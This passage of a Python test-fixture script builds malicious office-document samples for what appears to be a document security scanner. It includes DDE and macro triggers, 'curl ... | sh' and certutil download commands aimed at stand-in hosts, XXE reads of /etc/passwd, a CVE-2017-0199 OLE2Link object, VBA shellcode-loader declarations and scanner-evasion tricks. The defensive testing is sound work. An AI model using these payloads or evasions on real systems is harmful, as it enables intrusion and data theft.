    write(R / "office_zipslip.docx", docx(extra={"../../tmp/aitransit_escape.dotm": b"x"}))
    write(R / "office_elf.docx", ELF + b"\x00" * 200)
    write(R / "office_text.docx", b"This is not a Word document, just some text.\n")
    write(R / "office_empty.docx", b"")
    write(R / "office_truncated.docx", docx()[:150])
    write(R / "office_not_ooxml.docx", zbytes([("readme.txt", b"just a zip renamed .docx\n")]))
    write(R / "office_encrypted.docx", cfb({"EncryptionInfo": b"\x04\x00\x04\x00" + b"\x00" * 60, "EncryptedPackage": b"\x00" * 5000,
                                            "\x06DataSpaces": {"Version": b"\x00" * 8}}))

    # ── OpenDocument ────────────────────────────────────────────────────────
    write(R / "office_odf_macro.odt", odf(
        scripts='<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" '
                'script:event-name="office:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/>'
                "</office:event-listeners></office:scripts>",
        extra=basic_module("Module1", 'Sub Main\n  Shell("cmd /c calc.exe")\nEnd Sub\n')))
    write(R / "office_odf_macro_benign.ods", odf(
        mime="application/vnd.oasis.opendocument.spreadsheet",
        extra=basic_module("Module1", 'Sub Main\n  MsgBox "Hello"\nEnd Sub\n')))
    write(R / "office_odf_python.odt", odf(extra={
        "Scripts/python/report.py": b"import os\ndef run():\n    os.system('curl http://x.example/i | sh')\n"}))
    write(R / "office_odf_dde.ods", odf(
        mime="application/vnd.oasis.opendocument.spreadsheet",
        body='<table:table table:name="T"><table:table-row><table:table-cell><text:p>x</text:p></table:table-cell></table:table-row>'
             '<table:table-row><table:table-cell table:formula="of:=DDE(&quot;cmd&quot;;&quot;/c calc&quot;;&quot;x&quot;)"/></table:table-row></table:table>'
             '<table:dde-links><table:dde-link><office:dde-source office:dde-application="cmd" office:dde-topic="/c calc.exe" office:dde-item="x"/>'
             "</table:dde-link></table:dde-links>"))
    write(R / "office_odf_unc.odt", odf('<text:p><draw:frame><draw:image xlink:href="\\\\attacker.example\\share\\logo.png"/></draw:frame></text:p>'))
    write(R / "office_odf_remote.odt", odf('<text:p><draw:frame><draw:image xlink:href="http://tracker.example/pixel.gif"/></draw:frame></text:p>'))
    write(R / "office_odf_encrypted.odt", odf(manifest_extra='<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml">'
                                                '<manifest:encryption-data manifest:checksum-type="SHA1/1K"/></manifest:file-entry>'))
    write(R / "office_odf_flat_dde.fods", (CT_HEAD + f'<office:document {ODF_NS} office:mimetype="application/vnd.oasis.opendocument.spreadsheet">'
                                           '<office:body><office:spreadsheet><table:dde-links><table:dde-link>'
                                           '<office:dde-source office:dde-application="powershell" office:dde-topic="-enc AAAA" office:dde-item="x"/>'
                                           "</table:dde-link></table:dde-links></office:spreadsheet></office:body></office:document>").encode())

    # ── RTF ─────────────────────────────────────────────────────────────────
    write(R / "office_rtf_equation.rtf", rtf(rtf_object("Equation.3", b"cmd /c calc.exe " + b"A" * 60)))
    write(R / "office_rtf_autolink.rtf", rtf(rtf_object("htmlfile", b"http://attacker.example/x.hta", "\\objautlink\\objupdate")))
    write(R / "office_rtf_template.rtf", rtf("{\\*\\template http://attacker.example/evil.dotm}\\pard Hello\\par"))
    write(R / "office_rtf_package.rtf", rtf(rtf_object("Package", ole10native("invoice.exe", pe()))))
    write(R / "office_rtf_dde.rtf", rtf('{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"}{\\fldrslt x}}'))
    write(R / "office_rtf_object.rtf", rtf(rtf_object("Word.Document.8", cfb({"WordDocument": b"\x00" * 64}))))
    # The same Equation object with junk the RTF reader ignores: line breaks and empty groups inside the hex,
    # and the control word split from its argument by a group.
    h = ole1_object("Equation.3", b"cmd /c calc.exe " + b"A" * 60).hex()
    chunks = [h[i:i + 20] for i in range(0, len(h), 20)]
    obf = "{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata " + "{}\r\n".join(chunks) + "}}"
    write(R / "office_rtf_obfuscated.rtf", rtf(obf))

    # ── found by looking for ways round the rules ───────────────────────────
    # '>' is legal inside a quoted attribute value, and so is a single quote: a reader that cuts the
    # tag at the first '>' (or expects double quotes) never sees the Type and Target that follow.
    gt = (CT_HEAD + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
          f'<Relationship Id="a>b" Type="{REL}/oleObject" Target="http://attacker.example/x.html!" TargetMode="External"/>'
          f"<Relationship Id='c' Type='{REL}/attachedTemplate' Target='http://attacker.example/t.dotm' TargetMode='External'/>"
          "</Relationships>").encode()
    write(R / "office_gt_attr.docx", docx(extra={"word/_rels/document.xml.rels": gt}))
    # A ":LOW:" in a target must not turn the FAIL into a warning (record_fail reads severity from the message).
    write(R / "office_severity_marker.docx", docx(doc_rels=[("rId9", "image", "\\\\attacker:LOW:\\share\\x.png", True)]))
    write(R / "office_hidden_exe.docx", docx(extra={"word/media/image1.png": pe()}))
    body = base64.b64encode(bytes((i * 7 + 3) % 256 for i in range(144))).decode()
    pem = ("-----BEGIN RSA PRIVATE KEY-----\n" + "\n".join(body[i:i + 64] for i in range(0, len(body), 64))
           + "\n-----END RSA PRIVATE KEY-----")
    write(R / "office_pem.docx", docx("".join(f"<w:p><w:r><w:t>{ln}</w:t></w:r></w:p>" for ln in pem.split("\n"))))
    # The Excel 4.0 macro sheet that is visible and calls nothing dangerous: reported, not blocked.
    write(R / "office_xlm_visible.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                             '<sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></worksheet>').encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # A VBA storage whose streams hold nothing readable: a macro exists, its source cannot be seen.
    write(R / "office_vba_garbage.docm", docx(
        extra={"word/vbaProject.bin": cfb({"VBA": {"dir": b"\x00" * 40, "_VBA_PROJECT": b"\xcc\x61\xff\xff\x00\x00\x00", "Module1": b"\x01\x02\x03" * 20}})},
        content_extra=vba_ct))
    # Three documents deep is read; four is not.
    lvl = docx(doc_rels=[("rId9", "oleObject", "embeddings/o.bin", False)], extra={"word/embeddings/o.bin": cfb({"VBA": {"dir": b"\x00" * 40}})}) if False else None
    deep = docx(extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))}, content_extra=vba_ct)
    for _ in range(4):
        deep = docx(doc_rels=[("rId9", "package", "embeddings/inner.docx", False)], extra={"word/embeddings/inner.docx": deep})
    write(R / "office_nested_deep.docx", deep)
    # A part stored with a compression method nobody here can read.
    un = bytearray(docx(doc_rels=[("rId9", "oleObject", "embeddings/o.bin", False)], extra={"word/embeddings/o.bin": b"some bytes " * 30}))
    i = un.find(b"PK\x03\x04")
    while i != -1:
        nl = struct.unpack_from("<H", un, i + 26)[0]
        if bytes(un[i + 30:i + 30 + nl]) == b"word/embeddings/o.bin":
            struct.pack_into("<H", un, i + 8, 99)
        i = un.find(b"PK\x03\x04", i + 4)
    i = un.find(b"PK\x01\x02")
    while i != -1:
        nl = struct.unpack_from("<H", un, i + 28)[0]
        if bytes(un[i + 46:i + 46 + nl]) == b"word/embeddings/o.bin":
            struct.pack_into("<H", un, i + 10, 99)
        i = un.find(b"PK\x01\x02", i + 4)
    write(R / "office_unreadable.docx", bytes(un))
    # ODF: a hyperlink that runs a document macro on click (not on open), and a DDE link to an ordinary program.
    write(R / "office_odf_link_macro.odt", odf(
        '<text:p><text:a xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document">run</text:a></text:p>'))
    write(R / "office_odf_dde_benign.ods", odf(
        mime="application/vnd.oasis.opendocument.spreadsheet",
        body='<table:dde-links><table:dde-link><office:dde-source office:dde-application="soffice" office:dde-topic="x" office:dde-item="y"/>'
             "</table:dde-link></table:dde-links>"))

    # The dir stream is unreadable but the module streams are fine: the source is found by its signature.
    proj = vba_project({"ThisDocument": VBA_EVIL_DOC})
    proj["VBA"]["dir"] = b"\x00" * 40
    write(R / "office_vba_corrupt_dir.docm", docx(extra={"word/vbaProject.bin": cfb(proj)}, content_extra=vba_ct))
    # A hidden Excel 4.0 macro sheet that calls nothing: hiding it is the finding.
    write(R / "office_xlm_hidden_quiet.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="hidden" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                             '<sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></worksheet>').encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # Hostile strings in embedded scripts: an encoded PowerShell command, a certutil download.
    enc = base64.b64encode("Write-Host 'aitransit fixture payload'".encode("utf-16-le")).decode()
    write(R / "office_odf_hostile.odt", odf(extra={
        "Scripts/python/a.py": ("import os\ndef a():\n    os.system('powershell -nop -w hidden -enc " + enc + "')\n").encode(),
        "Scripts/python/b.py": b"def b():\n    cmd = 'certutil -urlcache -split -f http://x.example/a.exe a.exe'\n"}))
    # meta:template names the template a document was made from: every document made from a template has it.
    write(R / "office_safe_template_link.odt", odf(extra={"meta.xml": (
        CT_HEAD + '<office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
        'xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:xlink="http://www.w3.org/1999/xlink"><office:meta>'
        '<meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="Letter" '
        'xlink:href="file:///usr/share/templates/Letter.ott"/></office:meta></office:document-meta>').encode()}))

    # ── a second look: presentation actions, fetch fields, share schemes ────
    slide_ns = ('xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" ' + NS_R)

    def action_slide(action: str) -> dict:
        return {"ppt/slides/slide1.xml": (CT_HEAD + f'<p:sld {slide_ns}><p:cSld><p:spTree><p:sp><p:txBody><a:p><a:r>'
                                          f'<a:rPr><a:hlinkClick r:id="rId2" action="{action}"/></a:rPr><a:t>Click</a:t></a:r></a:p>'
                                          "</p:txBody></p:sp></p:spTree></p:cSld></p:sld>").encode(),
                "ppt/slides/_rels/slide1.xml.rels": rels([
                    ("rId2", "hyperlink", "file:///C:\\Windows\\System32\\cmd.exe", True)])}

    write(R / "office_pptx_program.pptx", pptx(extra=action_slide("ppaction://program")))
    write(R / "office_pptx_macro_action.pptx", pptx(extra=action_slide("ppaction://macro?name=Module1.Run")))
    fields = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE '
              '"\\\\attacker.example\\share\\logo.png" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
              '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDETEXT "http://remote.example/boiler.docx" </w:instrText></w:r>'
              '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    write(R / "office_field_include.docx", docx(fields))
    write(R / "office_smb.docx", docx(doc_rels=[("rId9", "image", "smb://attacker.example/share/logo.png", True)]))
    write(R / "office_cifs.docx", docx(doc_rels=[("rId9", "image", "cifs://attacker.example/share/logo.png", True)]))
    write(R / "office_file4.docx", docx(doc_rels=[("rId9", "image", "file:////attacker.example/share/logo.png", True)]))
    # An Excel web query (xl/connections.xml) fetches a page when the workbook refreshes.
    conn = lambda url: {"xl/connections.xml": (CT_HEAD + '<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                        f'<connection id="1" name="Query" type="4" refreshedVersion="6"><webPr url="{url}"/></connection></connections>').encode()}
    write(R / "office_webquery.xlsx", xlsx(extra=conn("http://remote.example/table.html")))
    write(R / "office_webquery_unc.xlsx", xlsx(extra=conn("\\\\attacker.example\\share\\table.html")))
    write(R / "office_webquery_safe.xlsx", xlsx(extra={"xl/connections.xml": (CT_HEAD + '<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                                       '<connection id="1" name="Local" type="1"><dbPr connection="Provider=SQLOLEDB" command="select 1"/></connection></connections>').encode()}))
    # Legacy PowerPoint keeps its VBA project in a zlib-compressed ExOleObjStg record, not in a CFB stream.
    raw = cfb(vba_project({"Module1": VBA_EVIL_DOC.replace("ThisDocument", "Module1")}))
    zc = zlib.compress(raw)
    ex = struct.pack("<HHI", 0x10, 0x1011, 4 + len(zc)) + struct.pack("<I", len(raw)) + zc
    write(R / "office_legacy_ppt_macro.ppt", cfb({"PowerPoint Document": struct.pack("<HHI", 0x000F, 0x03E8, len(ex)) + ex}))

    # An embedded workbook (a chart's data) is ordinary: found while measuring real documents, where every
    # chart in a .docx / .pptx came with one and each used to draw an "embedded object" warning.
    write(R / "office_embedded_workbook.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/Microsoft_Excel_Sheet1.xlsx", False)],
        extra={"word/embeddings/Microsoft_Excel_Sheet1.xlsx": xlsx()}))
    write(R / "office_legacy_objpool_workbook.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_4": {"Workbook": b"\x09\x08\x10\x00" + b"\x00" * 16 + b"\x0a\x00\x00\x00", "\x01CompObj": b"Microsoft Excel Worksheet\x00"}}}))
    # An embedded ZIP that is not an office document is opaque: reported, and it must not make the
    # DOCUMENT look "not an office document".
    write(R / "office_embedded_zip.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/data.zip", False)],
        extra={"word/embeddings/data.zip": zbytes([("readme.txt", b"just a zip\n")])}))
    # An OOXML package wrapped in an OLE object (a stream called Package): opened, and its macro found.
    inner_x = xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
                   content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
    write(R / "office_legacy_package_stream.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_5": {"Package": inner_x, "\x01CompObj": b"Package\x00"}}}))

    # ── found by red-teaming the scanner ────────────────────────────────────
    # An XML namespace prefix is arbitrary: only the URI it is bound to means anything. A reader that
    # looks for the literal text "w:instrText" is blind to the same document written with x:.
    dde_run = ('<{p}:p><{p}:r><{p}:fldChar {p}:fldCharType="begin"/></{p}:r><{p}:r><{p}:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" '
               '</{p}:instrText></{p}:r><{p}:r><{p}:fldChar {p}:fldCharType="end"/></{p}:r></{p}:p>')
    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    write(R / "office_rt_prefix_dde.docx", docx(doc_xml=CT_HEAD + f'<x:document xmlns:x="{wml}"><x:body>' + dde_run.format(p="x") + "</x:body></x:document>"))
    smlns = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
    write(R / "office_rt_prefix_formula.xlsx", xlsx(extra={"xl/worksheets/sheet1.xml": (
        CT_HEAD + f'<x:worksheet xmlns:x="{smlns}"><x:sheetData><x:row r="1"><x:c r="A1"><x:f>cmd|\'/c calc\'!A0</x:x:f></x:c></x:row></x:sheetData></x:worksheet>'
    ).replace("</x:x:f>", "</x:f>").encode()}))
    write(R / "office_rt_prefix_listener.odt", odf(
        scripts='<office:scripts><office:event-listeners><zz:event-listener xmlns:zz="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
                'zz:language="ooo:script" zz:event-name="office:load" '
                'xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/>'
                "</office:event-listeners></office:scripts>",
        extra=basic_module("Module1", 'Sub Main\n  MsgBox "hello"\nEnd Sub\n')))
    prel = ("http://schemas.openxmlformats.org/package/2006/relationships")
    write(R / "office_rt_prefix_rels.docx", docx(extra={
        "word/settings.xml": (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode(),
        "word/_rels/settings.xml.rels": (CT_HEAD + f'<q:Relationships xmlns:q="{prel}"><q:Relationship Id="rId1" '
                                         f'Type="{REL}/attachedTemplate" Target="http://attacker.example/evil.dotm" TargetMode="External"/></q:Relationships>').encode()}))
    # The main part need not be word/document.xml: _rels/.rels and [Content_Types].xml say where it is.
    write(R / "office_rt_moved_main.docx", zbytes([
        ("[Content_Types].xml", (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                 '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                 '<Override PartName="/doc/main.dat" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>').encode()),
        ("_rels/.rels", rels([("rId1", "officeDocument", "doc/main.dat", False)])),
        ("doc/main.dat", (CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>").encode())]))
    xlm_rt = (CT_HEAD + f'<worksheet xmlns="{smlns}"><sheetData><row r="1"><c r="A1"><f>EXEC("cmd /c calc.exe")</f></c></row>'
              '<row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></worksheet>')
    write(R / "office_rt_moved_macrosheet.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "ms/sheet2.xml", False)],
        extra={"xl/ms/sheet2.xml": xlm_rt.encode()},
        content_extra='<Override PartName="/xl/ms/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # Office reads UTF-16 XML parts. A decoder that assumes UTF-8 sees mojibake.
    def u16(xml_bytes: bytes) -> bytes:
        return b"\xff\xfe" + xml_bytes.decode().replace('encoding="UTF-8"', 'encoding="UTF-16"').encode("utf-16-le")
    write(R / "office_rt_utf16_rels.docx", docx(extra={
        "word/settings.xml": (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode(),
        "word/_rels/settings.xml.rels": u16(rels([("rId1", "attachedTemplate", "http://attacker.example/evil.dotm", True)]))}))
    write(R / "office_rt_utf16_document.docx", docx(doc_xml=None, extra={"word/document.xml": u16(
        (CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>").encode())}))
    # CDATA and comments inside a field instruction: the text a parser hands to Word is the same.
    write(R / "office_rt_cdata_dde.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText><![CDATA[ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" ]]></w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
    write(R / "office_rt_comment_dde.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText> DD<!-- split -->EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
    # An external entity declared far from its ENTITY keyword, and one behind many harmless ones.
    xxe_doc = lambda decl: CT_HEAD + f'<!DOCTYPE d [{decl}]><w:document {NS_W}><w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body></w:document>'
    write(R / "office_rt_xxe_padded.docx", docx(doc_xml=xxe_doc('<!ENTITY a' + " " * 2600 + 'SYSTEM "file:///etc/passwd">')))
    write(R / "office_rt_xxe_after_many.docx", docx(doc_xml=xxe_doc("".join(f'<!ENTITY e{i} "x">' for i in range(400)) + '<!ENTITY ext SYSTEM "file:///etc/passwd">')))
    # CVE-2017-0199: an OLE2Link object whose URL moniker holds the target as UTF-16.
    def moniker_stream(u: str) -> bytes:
        u16b = (u + "\x00").encode("utf-16-le")
        return (struct.pack("<II", 0x02000001, 0) + b"\x00" * 8 + struct.pack("<I", 1) + bytes.fromhex("e0c9ea79f9bace118c8200aa004ba90b")
                + struct.pack("<I", len(u16b)) + u16b)
    link_cfb = lambda u: cfb({"\x01Ole": moniker_stream(u), "\x01CompObj": b"\x01\x00\xfe\xff\x03\x0a\x00\x00\xff\xff\xff\xff" + b"\x00" * 30},
                             clsids={(): bytes.fromhex("0003000000000000c000000000000046")})
    write(R / "office_rt_ole2link.rtf", rtf(rtf_object("OLE2Link", link_cfb("http://attacker.example/x.hta"), "\\objautlink\\objupdate\\rsltpict")))
    write(R / "office_rt_ole2link_local.rtf", rtf(rtf_object("OLE2Link", link_cfb("file:///C:/templates/letter.dotm"), "\\objautlink\\objupdate\\rsltpict")))
    write(R / "office_rt_ole2link.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
        "ObjectPool": {"_1": {"\x01Ole": moniker_stream("http://attacker.example/x.hta"), "\x01CompObj": b"\x01\x00\xfe\xff" + b"OLE2Link\x00" * 2}}}))
    # Shellcode-loader declarations: the API name comes before Lib on the declaration line, and a
    # declaration can continue across lines with " _".
    vba_shell = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr\n'
                 'Private Declare PtrSafe Function CreateThread Lib "kernel32" _\n    (ByVal a As Long, ByVal b As Long, ByVal c As LongPtr, d As Long, ByVal e As Long, f As Long) As LongPtr\n'
                 'Sub AutoOpen()\n    Dim p As LongPtr\n    p = VirtualAlloc(0, 4096, &H3000, &H40)\nEnd Sub\n')
    vba_alias = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function Alloc Lib "kernel32" Alias "VirtualAlloc" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr\n'
                 'Sub Document_Open()\n    Dim p As LongPtr\n    p = Alloc(0, 4096, &H3000, &H40)\nEnd Sub\n')
    vba_tick = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long\n'
                'Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)\n'
                'Sub AutoOpen()\n    Range("A1").Value = GetTickCount()\nEnd Sub\n')
    for nm, src in (("shell", vba_shell), ("alias", vba_alias), ("benign", vba_tick)):
        write(R / f"office_rt_vba_declare_{nm}.docm", docx(
            extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": src}))}, content_extra=vba_ct,
            main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
    # Flat OPC (a package written out as one XML file) and Word 2003 XML: Word opens both, whatever the extension.
    flat_parts = [
        ("/_rels/.rels", "application/vnd.openxmlformats-package.relationships+xml",
         f'<Relationships xmlns="{prel}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/></Relationships>'),
        ("/word/document.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
         f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>")]
    flat = lambda parts, extra="": ('<?xml version="1.0" standalone="yes"?><?mso-application progid="Word.Document"?>'
        '<pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">'
        + "".join(f'<pkg:part pkg:name="{n}" pkg:contentType="{c}"><pkg:xmlData>{x}</pkg:xmlData></pkg:part>' for n, c, x in parts) + extra + "</pkg:package>").encode()
    write(R / "office_rt_flat_opc.docx", flat(flat_parts))
    vba_blob = base64.b64encode(cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))).decode()
    write(R / "office_rt_flat_opc_macro.docx", flat(flat_parts[:1] + [(
        "/word/document.xml", "application/vnd.ms-word.document.macroEnabled.main+xml", f'<w:document {NS_W}><w:body><w:p/></w:body></w:document>')],
        extra=f'<pkg:part pkg:name="/word/vbaProject.bin" pkg:contentType="application/vnd.ms-office.vbaProject" pkg:compression="store">'
              f"<pkg:binaryData>{vba_blob}</pkg:binaryData></pkg:part>"))
    write(R / "office_rt_wordml2003.doc", ('<?xml version="1.0"?><w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">'
          "<w:body>" + dde_run.format(p="w") + "</w:body></w:wordDocument>").encode())
    write(R / "office_rt_plain_xml.docx", b'<?xml version="1.0"?><notes><item>just an xml file named .docx</item></notes>\n')

    # Two attributes can share a local name under different prefixes. Word reads the unprefixed Type;
    # a reader that keeps only one value, first or last, can be pointed at the harmless x:Type.
    def tmpl_rels(attrs_xml: str) -> bytes:
        return (CT_HEAD + f'<Relationships xmlns="{prel}" xmlns:x="urn:example:x"><Relationship Id="rId1" {attrs_xml} '
                'Target="http://attacker.example/evil.dotm" TargetMode="External"/></Relationships>').encode()
    settings_part = (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode()
    for nm, attrs_xml in (("last", f'Type="{REL}/attachedTemplate" x:Type="{REL}/hyperlink"'),
                          ("first", f'x:Type="{REL}/hyperlink" Type="{REL}/attachedTemplate"')):
        write(R / f"office_rt_attr_collision_{nm}.docx", docx(extra={"word/settings.xml": settings_part,
                                                                     "word/_rels/settings.xml.rels": tmpl_rels(attrs_xml)}))
    # UTF-16 without a byte-order mark (little-endian) and with one (big-endian).
    tr = rels([("rId1", "attachedTemplate", "http://attacker.example/evil.dotm", True)]).decode().replace('encoding="UTF-8"', 'encoding="UTF-16"')
    write(R / "office_rt_utf16le_nobom_rels.docx", docx(extra={"word/settings.xml": settings_part, "word/_rels/settings.xml.rels": tr.encode("utf-16-le")}))
    write(R / "office_rt_utf16be_rels.docx", docx(extra={"word/settings.xml": settings_part, "word/_rels/settings.xml.rels": b"\xfe\xff" + tr.encode("utf-16-be")}))
    # A macro sheet is a macro sheet because the content type says so, or because the workbook relationship does:
    # either alone is enough, wherever the part lives.
    mrels = lambda typ, tgt: [("rId2", typ, tgt, False)]
    xlm_t = "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet"
    two_sheets = '<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/>'
    write(R / "office_rt_macrosheet_ctype_only.xlsm", xlsx(
        sheets=two_sheets, wb_rels=mrels("worksheet", "ms/sheet2.xml"), extra={"xl/ms/sheet2.xml": xlm_rt.encode()},
        content_extra='<Override PartName="/xl/ms/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_rt_macrosheet_rel_only.xlsm", xlsx(
        sheets=two_sheets, wb_rels=mrels(xlm_t, "ms/sheet2.xml"), extra={"xl/ms/sheet2.xml": xlm_rt.encode()},
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_rt_macrosheet_dotdot.xlsm", xlsx(
        sheets=two_sheets, wb_rels=mrels(xlm_t, "../elsewhere/sheet2.xml"), extra={"elsewhere/sheet2.xml": xlm_rt.encode()},
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_rt_macrosheet_absolute.xlsm", xlsx(
        sheets=two_sheets, wb_rels=mrels(xlm_t, "/data/sheet2.xml"), extra={"data/sheet2.xml": xlm_rt.encode()},
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # A VBA project is one because of its content type or the relationship that points at it, not its file name.
    proj_bin = cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))
    write(R / "office_rt_vba_ctype_only.docx", docx(extra={"word/data/macros.dat": proj_bin},
        content_extra='<Override PartName="/word/data/macros.dat" ContentType="application/vnd.ms-office.vbaProject"/>'))
    write(R / "office_rt_vba_rel_only.docx", docx(extra={"word/data/macros.dat": proj_bin},
        doc_rels=[("rId8", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "data/macros.dat", False)]))
    # An embedded package outside word/embeddings/ (the relationship says what it is), and an OLE file under no name at all.
    write(R / "office_rt_embedded_elsewhere.docx", docx(
        doc_rels=[("rId9", "oleObject", "data/payload.bin", False)], extra={"word/data/payload.bin": pkg_exe}))
    write(R / "office_rt_ole_unnamed.docx", docx(extra={"word/media/thumb.dat": proj_bin}))
    # An embedded package that is not an OLE file, so only the relationship says what it is.
    inner_pkg = xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
                     content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
    write(R / "office_rt_embedded_pkg_elsewhere.docx", docx(
